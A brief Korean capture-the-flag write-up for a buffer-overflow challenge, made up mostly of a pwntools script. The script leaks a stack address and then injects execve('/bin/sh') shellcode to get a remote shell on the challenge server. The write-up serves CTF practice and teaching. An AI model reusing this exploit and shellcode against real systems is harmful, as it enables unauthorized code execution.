## No. 9 Pwnable OH MY BOF[100]

**점수:** 100

**분야:** Pwnable

**제목:** OH MY BOF

**Description:**

> I made a simple BOF.
> 
> nc 223.194.105.182 41001
> Download : https://goo.gl/oxc1fS

쉘코드를 실행하기 위해 먼저 버퍼의 주소를 leak 시킨다. 

그리고 디버깅을 통해 스택의 적절한 값과 버퍼와의 거리를 알아낼 수 있었다.
 
```python
from pwn import *
 
r = remote('223.194.105.182', 41001)
 
r.recvn(24)
 
payload = '\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
payload += p32(0x80483e3)
r.send(payload)
leak = r.recvn(24)
esp = u32(leak[8:12]) - 0x98
log.info('esp is {}'.format(hex(esp)))
 
payload = 'a' * 24
payload += p32(esp + 4)
payload += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
r.send(payload)
 
r.interactive()
```
